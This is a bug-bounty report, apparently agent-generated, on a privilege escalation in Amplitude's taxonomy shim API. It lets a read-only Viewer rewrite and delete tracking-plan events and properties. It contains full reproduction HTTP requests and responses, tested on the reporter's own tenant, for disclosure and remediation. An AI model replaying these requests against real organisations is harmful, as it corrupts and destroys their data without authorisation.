# Amplitude Data taxonomy shim — the read-only **Viewer** role can rewrite and **delete** the project's tracking plan (`/o/taxonomy-api-shim/*`)

**Target:** App Platform — `https://app.amplitude.com` (Data taxonomy shim)
**VRT:** Broken Access Control (BAC) > Privilege Escalation
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` = **7.1 (High)**
**Date:** 2026-09-20
**Tested org:** `464637` (`agentmail-602393`), app `862908` — our own tenant only.

---

## Summary

Amplitude Data exposes a session-authenticated REST shim at `/o/taxonomy-api-shim/*` on
`app.amplitude.com`. It is the route the shipped Data / llm-analytics clients use to edit the
tracking plan, and it carries the `PUT` and `DELETE` verbs for planned **events** and planned
**event properties**.

The shim authenticates the caller and validates that the body `appId` is a project the caller can
reach — but it **never evaluates the role permission that governs tracking-plan changes**. As a
result an authenticated **Viewer** (`orgRole 1`, the lowest non-zero role in Amplitude, whose own
permission table grants it *no* Data-app permissions at all) is accepted on every write and delete
verb:

```
VIEWER  PUT    /o/taxonomy-api-shim/event/{planned event}             -> 200 {"success":true}
        read-back through the project-key REST taxonomy               -> the description PERSISTED
ORG_ADMIN same call                                                    -> 200 {"success":true}  (identical)
        read-back                                                     -> PERSISTED

VIEWER  DELETE /o/taxonomy-api-shim/event/{planned event}             -> 200 {"success":true}
        read-back                                                     -> 400 "Not found"  (destroyed)
ORG_ADMIN same call                                                    -> 200 {"success":true}  (identical)

VIEWER  PUT    /o/taxonomy-api-shim/event-property/{planned property} -> 200 {"success":true}
        read-back                                                     -> PERSISTED
VIEWER  DELETE /o/taxonomy-api-shim/event-property/{planned property} -> 200 {"success":true}
        read-back                                                     -> 400 "Not found"  (destroyed)
```

The Org-Admin control is what makes this an **authorization** result rather than an endpoint
failure: both roles are accepted with byte-equivalent responses and identical persistence.

Two things make the defect sharper than "a missing check":

* The shim's own `GET /o/taxonomy-api-shim/info?appId=` endpoint **is** a permission signal — it
  returns `{"readOnly": …, "readOnlyReason": …}`, and it answers
  `readOnlyReason: "Insufficient permissions"` when the caller cannot reach the app. For a Viewer on
  its own project it returns **`readOnly: false`**, i.e. the shim actively tells the client the
  lowest role may edit. The predicate behind that flag is *app membership*, not the tracking-plan
  permission.
* The `DELETE` verb is **not used by any shipped client** (both bundles only ever issue `PUT`): a
  destructive route exists on the public shim with no client-side gate and no server-side role
  check, and there is no restore verb on the shim (`/restore` → `404`), so the role that can destroy
  a planned event type cannot undo it.

---

## Relationship to previously submitted reports

| | |
| --- | --- |
| `c1f935a8` (Developer API Viewer escalation) | **different asset and mechanism** — `developer-api.amplitude.com`, where authorization is the OAuth scope string and org RBAC is never consulted. No OAuth token is involved here; this is an ordinary browser session on `app.amplitude.com`. |
| `SUBMISSION-GS-AUTHZ.md` — Guides & Surveys / Houston (`/a/`, `/h/`) | **different backends and different object** — Django REST viewsets for guides, surveys, themes, collections, syncs. Nothing in this finding touches `/a/` or `/h/`. **Duplicate risk, stated in both directions:** if the program prefers to treat "the lowest-privilege role is not checked on a write route" as one root cause, this shim report should be folded into `SUBMISSION-GS-AUTHZ.md` as an **additional impact** rather than closed as a duplicate — it is a different route prefix (`/o/taxonomy-api-shim/*`), a different object (the tracking plan, with a destructive `DELETE` verb and no restore) and a different fix. |
| Global Agent IDOR (`/fed/graphql`) | different asset entirely. |
| The already-recorded **`uploadTaxonomy`** observation | same *class* (missing/incorrect permission evaluation on a taxonomy write path) but **not the same route, object or outcome**. `uploadTaxonomy` is a GraphQL resolver in the llm-analytics surface; its write was refused for *every* role by a read-only DB transaction, so it was recorded as a clean negative. **Here the write executes and persists**, and the destructive verb works. |

No previously filed report covers `/o/taxonomy-api-shim/*`.

---

## Roles used (verified live in this run)

```
POST /t/graphql/org/464637?q=OrgData
{"query":"query OrgData { apps { id name apiKey secretKey } currentUser { loginId orgRole } }"}

VIEWER    (mohamed-9499-2+member@agentmail.to) -> 200 {"currentUser":{"loginId":"mohamed-9499-2+member@agentmail.to","orgRole":1}, "apps":[{"id":"862908",…,"secretKey":null}]}
ORG_ADMIN (mohamed-9499-3@agentmail.to)        -> 200 {"currentUser":{"loginId":"mohamed-9499-3@agentmail.to","orgRole":4}, "apps":[{"id":"862908",…,"secretKey":"a6bbcc1f2e…32be"}]}

POST /t/graphql/org/464637?q=ProductPermissionOwnRole   {"product":"analytics"}
VIEWER    -> 200 {"productPermissionOwnRole":{"orgRole":1,"appRoles":null}}
ORG_ADMIN -> 200 {"productPermissionOwnRole":{"orgRole":4,"appRoles":null}}
```

`appRoles: null` for both — the Viewer has **no app-level role elevation**, so `orgRole 1` is the
effective role. (`orgRole` enum, recovered from the shipped stargate bundle:
`NONE=0, VIEWER=1, MEMBER=2, MANAGER=3, ORG_ADMIN=4, AMP_ADMIN=5`.)

---

## Steps to Reproduce

Everything below is reproducible in the order given. The **read-back channel is the project-key REST
taxonomy (`/api/2/taxonomy/*`, HTTP Basic `{apiKey}:{secretKey}`)** — a *different credential plane*
from the session-authenticated shim, so a persisted change cannot be explained by client state,
caching or optimistic UI.

### Step 0 — the shim's own permission flag is permission-derived, and wrong for the Viewer

```
GET /o/taxonomy-api-shim/info?appId=862908 HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1
```
```
HTTP/1.1 200
{"success": true, "data": {"readOnly": false, "readOnlyReason": null, "isVersionedApp": true}}
```
The same call as the Org Admin returns the identical body. The control that proves `readOnly` is a
*permission* signal and not a constant:

```
GET /o/taxonomy-api-shim/info?appId=999999999   (VIEWER, an app the caller cannot reach)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}

GET /o/taxonomy-api-shim/info                   (VIEWER, no appId)
-> 200 {"success": true, "data": {"readOnly": true, "readOnlyReason": "Insufficient permissions"}}
```

### Step 1 — create throwaway objects so the write is observable (project key)

```
POST /api/2/taxonomy/category HTTP/1.1
Host: amplitude.com
Authorization: Basic <project key pair>
Content-Type: application/x-www-form-urlencoded

category_name=hermes_taxshim_verify_cat
-> 200 {"success": true}

POST /api/2/taxonomy/event
event_type=hermes_taxshim_verify_viewer&category=hermes_taxshim_verify_cat&description=baseline-viewer-desc
-> 200 {"success": true}
```

### Step 2 — OWNER CONTROL: the Org Admin writes through the shim

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_admin HTTP/1.1
Host: app.amplitude.com
Cookie: <ORG_ADMIN session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_admin_write_probe","category":"hermes_taxshim_verify_cat"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_admin    (project key)
-> 200 {"success":true,"data":{…,"description":"hermes_admin_write_probe",…}}      <- PERSISTED
```

### Step 3 — **the finding**: the same write as the Viewer

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>                    <- orgRole 1, appRoles null
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908","description":"hermes_viewer_write_probe","category":"hermes_taxshim_verify_cat"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 200 {"success":true,"data":{"event_type":"hermes_taxshim_verify_viewer",
                               "description":"hermes_viewer_write_probe", …}}       <- PERSISTED
```

Byte-for-byte the same `200 {"success":true}` the Org Admin received, and the same persistence.

### Step 4 — **the finding**: the Viewer destroys a planned event type

```
DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer HTTP/1.1
Host: app.amplitude.com
Cookie: <VIEWER session>
x-csrf-token: 1
Content-Type: application/json

{"appId":"862908"}
```
```
HTTP/1.1 200
{"success":true}
```
```
GET /api/2/taxonomy/event/hermes_taxshim_verify_viewer   (project key)
-> 400 {"success":false,"errors":[{"message":"Not found"}]}          <- the event type is GONE
```

The Org Admin's identical `DELETE` on a second planned event produced the same `200` and the same
`400 "Not found"` read-back, so the verb itself is functional for a permitted role.

### Step 5 — the property route behaves the same way

```
PUT /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop HTTP/1.1
Cookie: <VIEWER session>
{"appId":"862908","description":"hermes_viewer_prop_probe","category":null}
-> 200 {"success":true}
GET /api/2/taxonomy/event-property/hermes_taxshim_verify_prop?event_type=hermes_taxshim_verify_propev
-> 200 {…"description":"hermes_viewer_prop_probe"…}                  <- PERSISTED

DELETE /o/taxonomy-api-shim/event-property/hermes_taxshim_verify_prop
Cookie: <VIEWER session>
{"appId":"862908"}
-> 200 {"success":true}
GET (same read-back) -> 400 {"success":false,"errors":[{"message":"Not found"}]}   <- destroyed
```

### Step 6 — the scoping control (why this is *intra-project*, stated honestly)

```
PUT /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer      (VIEWER, foreign body appId)
{"appId":"999999999","description":"hermes_fakeapp_probe","category":"hermes_taxshim_verify_cat"}
-> 403 {"success":false,"errors":[{"message":"Requested operation requires additional permissions."}]}
GET read-back -> the object is UNCHANGED

DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_scope    (VIEWER, foreign body appId)
{"appId":"999999999"}
-> 403 (same message)
GET read-back -> 200, the object SURVIVED
```

The body `appId` **is** validated against the caller's reachable projects on both verbs. The bypass
is therefore strictly *inside a project the caller can already see*, not a cross-project write.

### Step 7 — negative controls

```
PUT    /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER, real appId)
-> 404 {"success":false,"errors":[{"message":"Attempted to update an event,
        \"hermes_taxshim_verify_nonexistent\", that is not a planned event."}]}

DELETE /o/taxonomy-api-shim/event/hermes_taxshim_verify_nonexistent   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}

PUT    /o/taxonomy-api-shim/event/…      (no session at all)
-> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
DELETE /o/taxonomy-api-shim/event/…      (no session at all)
-> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
GET    /o/taxonomy-api-shim/info?appId=862908   (no session at all)
-> 401 {"success":false,"errors":[{"message":"Unauthorized"}]}
```

So the route is authenticated, it validates the object it is handed, and the `200`s in steps 3–5 are
real state changes — not a blanket `200` from an unguarded endpoint.

### Step 8 — there is no restore path for the role that did the deleting

```
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"success":false,"errors":[{"message":"Not found"}]}
PUT  /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer/restore   (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot PUT /taxonomy-api-shim/event/…/restore","error":"Not Found"}
POST /o/taxonomy-api-shim/event/hermes_taxshim_verify_viewer           (VIEWER)
-> 404 {"statusCode":404,"message":"Cannot POST /taxonomy-api-shim/event/…","error":"Not Found"}
```

The shim exposes only `PUT` and `DELETE` for `event/{event}` — no create, no restore. The only
restore primitive is on the project-key REST surface (`/api/2/taxonomy/event/{type}/restore`), and
the Viewer **cannot obtain the project key**: `OrgData` returns `secretKey: null` for `orgRole 1`
(read-back in the Roles section above). A Viewer's deletion is one-way for the Viewer.

---

## Why this is a defect and not a design choice

The intended policy is documented by the vendor in three independent places, all of which say a
Viewer (role 1) must be refused. I re-extracted each one myself from the shipped artefacts.

**1. The client's own role→action matrix** — `CHANGE_TRACKING_PLANS`, which the client labels
`"Update Tracking Plan"`, is `{1:false, 2:true, 3:true, 4:true}`:

```
# bundles/app-js-x/static.amplitude.com_assistance_…_assets_v0_permissions-CfHNZOlf.js
# bundles/app-js-x/static.amplitude.com_skylab_…_assets_v0_permissions-DFed8u4m.js
# bundles/app-js-x/static.amplitude.com_stargate_…_assets_v0_permissions-j82hB54P.js   (identical map)
BASIC_DATA_ACCESS:{1:!0,2:!0,3:!0,4:!0}, BASIC_MEMBER_ACCESS:{1:!1,2:!0,3:!0,4:!0},
BASIC_MANAGER_ACCESS:{1:!1,2:!1,3:!0,4:!0},
CHANGE_TRACKING_PLANS:{1:!1,2:!0,3:!0,4:!0},          <- "Update Tracking Plan"
MANAGE_TRACKING_PLANS:{1:!1,2:!1,3:!0,4:!0},
MANAGE_DATA_SETTINGS:{1:!1,2:!1,3:!0,4:!0}

# the label, same enum, in bundles/app-js-x/…_v0_profile-page-content-tab-D0F0ymA9.js and gs-app/default-DVIHXpVQ.js
CHANGE_TRACKING_PLANS:e(`Update Tracking Plan`,{ns:$})

# the enum itself, bundles/app-js-x/…_stargate_…_assets_v0_utils-Daz5dCk2.js
NONE=0, VIEWER=1, MEMBER=2, MANAGER=3, ORG_ADMIN=4, AMP_ADMIN=5
```

**2. The Data app's own permission table** (same stargate bundle) grants a Viewer **nothing**, and
puts `can-edit-taxonomy` at MANAGER and above:

```js
g=[`can-edit-version`,`can-merge-schema`,`can-create-custom-events`,`can-delete-restore-event`,`can-edit-profile-property`]
_=[...g,`can-delete-restore-property`,`can-delete-group-type`,`can-approve-schema`,`can-edit-taxonomy`,
   `can-edit-workspace`,`can-block-events-and-properties`,`can-transform-events-and-properties`]
b={ [NONE]:[], [VIEWER]:[], [MEMBER]:g, [MANAGER]:_, [ORG_ADMIN]:[..._], [AMP_ADMIN]:[…] }
```

**3. The vendor's documentation** (`docs/amp-full.txt`):

> "Amplitude MCP exposes tools to read and write your project's tracking plan taxonomy. Create,
> update, delete, and restore calls require the **Use MCP (write)** RBAC action. **Changes to events
> and properties also require the Update Tracking Plan permission in Amplitude Data.**"

**4. The strongest single artefact** — the *same bundle* derives the *same* `readOnly` /
`readOnlyReason` pair for the Data app **from `CanEditTaxonomy`**, and falls back to a
no-permissions reason when it is absent:

```js
j=()=>{ let {data:[n]} = D([b.CanEditTaxonomy]); …
        return n ? {readOnly: !r, readOnlyReason: r?void 0:NOT_ON_MAIN}
                 : {readOnly: true, readOnlyReason: NO_PERMISSIONS} }
```

The shim's `info` endpoint returns exactly those two field names — so it was meant to mirror this
gate — but it computes them from **app membership** instead of `can-edit-taxonomy`, and therefore
reports `readOnly: false` to a role the client's own matrix says may not change the tracking plan.
That is an incorrect permission evaluation, not merely an absent one.

---

## Impact

* **Integrity (I:H).** The lowest non-zero role can rewrite the tracking plan: event descriptions,
  event categories, and planned **event properties** — the Data product's core object, and the one
  the vendor's own MCP documentation says requires the *Update Tracking Plan* permission.
* **Availability (A:L).** The Viewer holds a working `DELETE` for planned event types, and the
  vendor documents the consequence of that action in the product's own words:

  > "**Deleting event types also blocks all future instances of events with the same name.** If you
  > send data to a deleted or blocked event name in Amplitude, the data doesn't come through."
  > … "Ingested events and properties: Amplitude marks them as deleted and **stops ingesting** them."

  So the destructive verb this role should never reach is the verb that stops data collection for
  the affected event name, and the deletion is **not reversible by the role that performed it**
  (no shim restore verb — step 8 — and `secretKey: null` for role 1, so the project-key
  `/taxonomy/event/{type}/restore` route is out of reach).
* **No confidentiality impact (C:N)** — the shim exposes no data the Viewer could not already read,
  and the bypass stays inside a project the caller can already reach.
* **Detectability.** Nothing in the responses distinguishes the Viewer's write from the Admin's; both
  are `200 {"success":true}` with identical bodies, and no authorization decision is surfaced to the
  caller. A Viewer silently rewriting or deleting plan entries leaves no signal in the API responses.
* The write path also ignores the **version/branch dimension**: the app reports
  `isVersionedApp: true`, and the bundle's own gate refuses edits off the default branch, yet the
  shim accepts the write and reports `readOnly:false` regardless.

### Ceiling — stated explicitly

This is a **7.1 (High)** finding, and it is deliberately **not** called Critical: there is no
cross-tenant reach, no cross-project reach (the `appId` scoping control in step 6 returns `403`),
no confidentiality impact, no PII and no credential. If the availability term is disputed, the score
drops to `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5 (Medium)**; the integrity half of the
finding does not depend on it.

---

## Scope of the bypass (honest statement)

* **Intra-project role bypass only.** The caller must already be a member of org `464637` with access
  to app `862908`. The body `appId` is validated against the caller's reachable projects on both
  verbs (`403 "Requested operation requires additional permissions."`, state unchanged), so the shim
  cannot be used to touch another project.
* Org `464637` holds exactly **one** app (`OrgData.apps = [862908]`), so a true cross-project test
  was not possible on this tenant; the fabricated-`appId` control is the substitute evidence.
* No other org was touched (`464586`, `3149` were never addressed in this run).

---

## Remediation

The fix is server-side, in the shim, and is small:

1. **Evaluate the tracking-plan permission on every state-changing verb.** Before touching the
   object, the shim must require the same permission the client matrix uses —
   `CHANGE_TRACKING_PLANS` / Data-app `can-edit-taxonomy`, i.e. **Manager (3) and above** — for
   `PUT` **and** `DELETE` on `event/{event}`, `event-property/{property}` and `user-property/{property}`.
   A caller with `orgRole < 3` (or an app-level role override below Manager) must receive `403`
   **before** object lookup, matching the wording already used for the `appId` check.
2. **Derive `info.readOnly` from the same predicate.** `GET /o/taxonomy-api-shim/info` must compute
   `readOnly` / `readOnlyReason` from `can-edit-taxonomy` rather than from app membership, so the
   value the client gates its editor on matches the value the write path enforces. The stargate
   bundle's own `CanEditTaxonomy → readOnly/readOnlyReason` mapping is the reference implementation.
3. **Treat `DELETE` as privileged or remove it.** The verb is not used by any shipped client and it
   is the destructive one; if it is retained for internal callers it must be gated at Manager+ (or
   restricted to a server-to-server credential), and it should record an audit entry naming the
   caller and the object.
4. **Regression test:** walk the shim's route table with a Viewer session and assert `403` on every
   non-`GET` route, plus a positive test that a Manager session still succeeds. Add the same
   assertion to the `info` flag.

---

## Negative controls / ceilings checked

| Control | Result |
| --- | --- |
| Org-Admin `PUT` / `DELETE` on the same routes | `200 {"success":true}`, persistence identical to the Viewer → the `200`s are an authorization result, not an endpoint failure |
| Anonymous `PUT` / `DELETE` / `GET info` | `401 {"success":false,"errors":[{"message":"Unauthorized"}]}` → the route is authenticated |
| Body `appId: 999999999` (foreign project) on `PUT` and `DELETE` | `403 "Requested operation requires additional permissions."`, state unchanged → no cross-project reach |
| `PUT`/`DELETE` of a fabricated (not-planned) event name | `404 "…not a planned event."` / `404 "Not found"` → the object is validated; the `200`s are real writes |
| `info?appId=999999999`, `info` with no `appId` | `readOnly:true, readOnlyReason:"Insufficient permissions"` → `readOnly` is permission-derived, and it lies only for the Viewer's own app |
| Viewer obtains the project key | `OrgData` → `secretKey: null` for `orgRole 1` (and `appRoles: null`) |
| Restore path for the Viewer | shim `/restore` → `404`; no create verb (`404 Cannot POST`) |

---

## Cleanup — every artefact created by this run, removed and verified by read-back

| object | created by | removed by | final read-back |
| --- | --- | --- | --- |
| category `hermes_taxshim_verify_cat` (id 2136997) | REST POST | REST DELETE | `GET /api/2/taxonomy/category` → `[]` |
| event `hermes_taxshim_verify_admin` | REST POST | **ADMIN shim DELETE** | `400 "Not found"` |
| event `hermes_taxshim_verify_viewer` | REST POST | **VIEWER shim DELETE** (the finding) | `400 "Not found"` |
| event `hermes_taxshim_verify_scope` | REST POST | REST DELETE (after surviving the foreign-`appId` DELETE) | `400 "Not found"` |
| event `hermes_taxshim_verify_propev` | REST POST | REST DELETE | not in `GET /api/2/taxonomy/event` |
| event `hermes_taxshim_verify_propev2` | REST POST | REST DELETE | not in the event list |
| property `hermes_taxshim_verify_prop` | REST POST | **VIEWER shim DELETE** | `400 "Not found"`; global list 35, no residue |
| property `hermes_taxshim_verify_prop2` | REST POST | global REST DELETE (see note) | global list 35, no residue |

Final tenant state, read back through the project-key API:

```
GET /api/2/taxonomy/event           -> 8 events   (baseline 8), zero hermes* residue
GET /api/2/taxonomy/event-property  -> 35         (baseline 35), zero hermes* residue
GET /api/2/taxonomy/category        -> []         (baseline [])
```

No pre-existing tenant object was modified or deleted. Two property artefacts from **earlier** agent
runs (`authz_prop_dea06979`, `ro_fixture_prop`) are visible in the property taxonomy; they are not
ours to delete and were left in place.

**Residue note (found explicitly, as flagged by the discovery run):** deleting a planned *event*
does **not** remove the planned properties attached to it — the global property list stayed at 36
across the event delete and only dropped back to 35 after an explicit
`DELETE /api/2/taxonomy/event-property/<prop>` **without** `event_type`. The shim's own property
`DELETE` did remove the global property cleanly (no residue). Anyone using this route destructively
should know that an event-scoped cleanup can leave orphaned properties behind.

**Budget:** 73 requests, ≥1.7 s apart, `curl_cffi impersonate='chrome124'`, every call retried,
within the 150-request cap for this run. Secrets masked `first10…last4` throughout.

---

## Open proof gaps

1. **The ingestion-stopping consequence is documented, not observed.** The vendor states that
   deleting an event type blocks all future instances of that name and stops ingestion; I did not
   independently observe ingestion stopping for a deleted event on this tenant. The `A:L` term rests
   on the vendor's documented semantics of the delete action, not on a measurement here.
2. **Member (`orgRole 2`) was not tested.** No Member session was available for this run; the policy
   matrix says role 2 *should* be permitted, so testing it would not change the finding. The
   Viewer-vs-Admin differential is the load-bearing evidence.
3. **Cross-project reach is untestable on this tenant** (one app in org `464637`). The
   `appId: 999999999` control is the substitute and it is clean (`403`, unchanged).
4. **No restore-path enumeration.** `/restore` (`POST`, `PUT`) and `POST` on the event route are
   `404`; I did not exhaustively enumerate every possible restore/undo shape on the shim.
5. **The version/branch dimension was not resolved.** The app is `isVersionedApp: true` and the
   client's own gate refuses edits off the default branch, but I did not determine whether a shim
   write creates a taxonomy version or writes straight to main — no version endpoint was exercised.

---

## Evidence

| file | content |
| --- | --- |
| `escal/taxshim_raw.txt` | full raw HTTP transcript (request line + masked headers + body / status + body) for all 73 calls, numbered in execution order |
| `escal/taxshim_results.json` | per-call log (label, method, path, code, masked body) |
| `escal/taxshim_p1_baseline.json` | role truth (both sessions + `ProductPermissionOwnRole`), tenant baselines, the four `info` flag reads |
| `escal/taxshim_p2_write.json` | **the write finding** — Admin control, Viewer write, `appId` scoping control, fabricated-event control |
| `escal/taxshim_p3_delete.json` | **the delete finding** — Admin control, Viewer delete, scoping control on `DELETE`, fabricated control |
| `escal/taxshim_p4a_property.json`, `taxshim_p4b_cleanup.json` | property-route finding, residue test, cleanup read-backs |
| `escal/taxshim_p5_final.json` | anonymous controls, final tenant state |
| `escal/taxshim_p6_restore.json` | restore/create verb probes |
| `escal/taxshim_h.py` | harness (pacing, 150 cap, retry, masking, raw transcript) |
| `FINDINGS/LEDGER.md` | discovery entry and this re-verification |
